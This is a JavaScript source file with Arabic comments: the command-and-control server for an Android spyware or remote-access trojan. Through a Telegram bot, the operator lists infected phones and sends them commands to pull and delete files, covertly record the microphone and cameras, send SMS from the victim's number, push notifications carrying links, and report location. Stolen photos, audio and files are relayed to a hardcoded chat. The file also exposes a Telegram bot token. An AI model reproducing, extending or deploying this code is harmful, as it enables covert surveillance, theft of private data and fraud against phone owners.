const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

// ⚠️ غيّر التوكن فوراً
const token = '8834018446:AAFY9OmJ22qOeswwcTLsi1yTuafIWJzv41o';
const id = '5474851558';
const address = 'https://www.google.com';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

app.get('/', (req, res) => {
    res.send('<h1 align="center">✅ الخادم يعمل بنجاح</h1>');
});

app.post("/uploadFile", upload.single('file'), (req, res) => {
    appBot.sendDocument(id, req.file.buffer, {
        caption: `°• ملف من: <b>${req.headers.model || "غير محدد"}</b>`,
        parse_mode: "HTML"
    });
    res.send('');
});

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• نص من: <b>${req.headers.model || "غير محدد"}</b>\n\n${req.body.text}`, { parse_mode: "HTML" });
    res.send('');
});

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body.lat, req.body.lon);
    appBot.sendMessage(id, "°• تم استقبال الموقع");
    res.send('');
});

appSocket.on('connection', (ws, req) => {
    const uuid = uuidv4();
    const model = req.headers.model || "غير محدد";
    ws.uuid = uuid;
    appClients.set(uuid, {
        model: model,
        battery: req.headers.battery || "-",
        version: req.headers.version || "-",
        brightness: req.headers.brightness || "-",
        provider: req.headers.provider || "-"
    });

    appBot.sendMessage(id, `°• جهاز متصل ✅\n• النوع: <b>${model}</b>`, { parse_mode: "HTML" });

    // ==============================================
    // 🔴 الجزء المعدل: استقبال أي شيء بأي صيغة
    // ==============================================
    ws.on('message', (rawData) => {
        try {
            // استقبال نصي مباشر
            let data = rawData.toString('utf8');
            console.log(`📥 ورد من الجهاز [${uuid}]: ${data}`);

            // عرض كل ما يصل فوراً دون شروط
            if (!data.trim()) return;

            // محاولة التعرف على النوع فقط لتنظيم العرض
            if (data.startsWith('photo:') || data.startsWith('image:')) {
                const img = data.replace(/^(photo:|image:)/, '');
                appBot.sendPhoto(id, Buffer.from(img, 'base64'), {caption: "📸 صورة مستلمة"});
            }
            else if (data.startsWith('audio:')) {
                const aud = data.replace('audio:', '');
                appBot.sendAudio(id, Buffer.from(aud, 'base64'), {caption: "🎙️ صوت مستلم"});
            }
            else if (data.startsWith('file:')) {
                const fil = data.replace('file:', '');
                appBot.sendDocument(id, Buffer.from(fil, 'base64'), {caption: "📂 ملف مستلم"});
            }
            else if (data.startsWith('result:')) {
                appBot.sendMessage(id, `✅ النتيجة:\n${data.replace('result:', '')}`);
            }
            else if (data === 'ok' || data === 'done' || data === 'success') {
                appBot.sendMessage(id, "✅ تم تنفيذ الأمر بنجاح");
            }
            else {
                // أي محتوى آخر يظهر كما هو مهما كان
                appBot.sendMessage(id, `📩 رد من الجهاز:\n${data}`);
            }
        }
        catch (err) {
            // فشل تحويل النص: يعني غالباً ملف ثنائي نعرضه كملف مباشرة
            console.log(`⚠️ بيانات غير نصية وردت من [${uuid}]`);
            try {
                appBot.sendDocument(id, rawData, {caption: "📄 بيانات ملفية مستلمة"});
            } catch (e) {
                appBot.sendMessage(id, "⚠️ وردت بيانات غير معروفة النوع من الجهاز");
            }
        }
    });

    ws.on('close', () => {
        appClients.delete(uuid);
        appBot.sendMessage(id, `❌ انقطع اتصال: ${model}`);
    });

    ws.on('error', () => {});
});

// دالة إرسال آمنة للأوامر
function sendCommand(uuid, cmd) {
    appSocket.clients.forEach(ws => {
        if (ws.readyState === webSocket.OPEN && String(ws.uuid) === String(uuid)) {
            ws.send(cmd);
            console.log(`📤 أُرسل للجهاز [${uuid}]: ${cmd}`);
        }
    });
}

appBot.on('message', (msg) => {
    const cid = msg.chat.id;
    if (cid != id) return;

    if (msg.text == '/start') {
        appBot.sendMessage(id, "°• نظام التحكم جاهز ✅", {
            reply_markup: { keyboard: [["الاجهزة المتصلة"], ["تنفيذ الامر"]], resize_keyboard: true }
        });
    }
    else if (msg.text == 'الاجهزة المتصلة') {
        if (!appClients.size) return appBot.sendMessage(id, "لا يوجد أجهزة متصلة");
        let txt = "°• الأجهزة المتصلة:\n";
        appClients.forEach(v => txt += `• ${v.model}\n`);
        appBot.sendMessage(id, txt);
    }
    else if (msg.text == 'تنفيذ الامر') {
        if (!appClients.size) return appBot.sendMessage(id, "لا يوجد أجهزة");
        let kb = [];
        appClients.forEach((v,k) => kb.push([{text:v.model, callback_data:`sel:${k}`}]));
        appBot.sendMessage(id, "اختر الجهاز:", {reply_markup:{inline_keyboard:kb}});
    }

    // معالجة الردود على الرسائل
    if (msg.reply_to_message) {
        const txt = msg.reply_to_message.text;
        if (txt.includes('كتابة رقم')) { currentNumber = msg.text; appBot.sendMessage(id, "اكتب الرسالة:", {reply_markup:{force_reply:true}}); }
        else if (txt.includes('اكتب الرسالة') || txt.includes('الرسالة المراد')) { sendCommand(currentUuid, `send_message:${currentNumber}:${msg.text}`); currentUuid=currentNumber=''; appBot.sendMessage(id, "تم الإرسال ✅"); }
        else if (txt.includes('مسار الملف') && txt.includes('سحب')) { sendCommand(currentUuid, `file:${msg.text}`); currentUuid=''; }
        else if (txt.includes('حذف ملف')) { sendCommand(currentUuid, `delete_file:${msg.text}`); currentUuid=''; }
        else if (txt.includes('مدة التسجيل') && txt.includes('صوت')) { sendCommand(currentUuid, `microphone:${msg.text}`); currentUuid=''; }
        else if (txt.includes('كاميرا امامية')) { sendCommand(currentUuid, `rec_camera_main:${msg.text}`); currentUuid=''; }
        else if (txt.includes('كاميرا السلفي')) { sendCommand(currentUuid, `rec_camera_selfie:${msg.text}`); currentUuid=''; }
        else if (txt.includes('رسالة تظهر')) { sendCommand(currentUuid, `toast:${msg.text}`); currentUuid=''; }
        else if (txt.includes('نص الاشعار')) { currentTitle = msg.text; appBot.sendMessage(id, "اكتب الرابط:", {reply_markup:{force_reply:true}}); }
        else if (txt.includes('الرابط الذي تريد')) { sendCommand(currentUuid, `show_notification:${currentTitle}:${msg.text}`); currentUuid=currentTitle=''; }
        else if (txt.includes('رابط الصوت')) { sendCommand(currentUuid, `play_audio:${msg.text}`); currentUuid=''; }
    }
});

appBot.on('callback_query', (q) => {
    const d = q.data.split(':');
    const act = d[0];
    const uid = d[1];

    if (act == 'sel') {
        currentUuid = uid;
        appBot.editMessageText("اختر الأمر:", {
            chat_id:id, message_id:q.message.message_id,
            reply_markup:{inline_keyboard:[
                [{text:"📱 معلومات", callback_data:`info:${uid}`},{text:"📂 ملفات", callback_data:`fl:${uid}`}],
                [{text:"🎥 كاميرا", callback_data:`cam:${uid}`},{text:"🎙️ صوت", callback_data:`mic:${uid}`}],
                [{text:"📩 رسائل", callback_data:`sms:${uid}`},{text:"📳 اهتزاز", callback_data:`vib:${uid}`}],
                [{text:"⚠️ اشعار", callback_data:`ntf:${uid}`},{text:"📍 موقع", callback_data:`loc:${uid}`}]
            ]}
        });
    }
    else if (act == 'info') sendCommand(uid, 'device_info');
    else if (act == 'fl') { currentUuid=uid; appBot.deleteMessage(id,q.message.message_id); appBot.sendMessage(id,"أدخل مسار الملف:",{reply_markup:{force_reply:true}}); }
    else if (act == 'cam') sendCommand(uid, 'camera_main');
    else if (act == 'mic') { currentUuid=uid; appBot.deleteMessage(id,q.message.message_id); appBot.sendMessage(id,"مدة التسجيل ثواني:",{reply_markup:{force_reply:true}}); }
    else if (act == 'sms') { currentUuid=uid; appBot.deleteMessage(id,q.message.message_id); appBot.sendMessage(id,"أدخل الرقم:",{reply_markup:{force_reply:true}}); }
    else if (act == 'vib') sendCommand(uid, 'vibrate');
    else if (act == 'ntf') { currentUuid=uid; appBot.deleteMessage(id,q.message.message_id); appBot.sendMessage(id,"نص الإشعار:",{reply_markup:{force_reply:true}}); }
    else if (act == 'loc') sendCommand(uid, 'location');

    appBot.answerCallbackQuery(q.id);
});

setInterval(() => {
    appSocket.clients.forEach(w => { if(w.readyState===webSocket.OPEN) w.send('ping'); });
    axios.get(address).catch(()=>{});
}, 5000);

appServer.listen(process.env.PORT||8999, ()=>console.log("✅ الخادم جاهز على المنفذ 8999"));
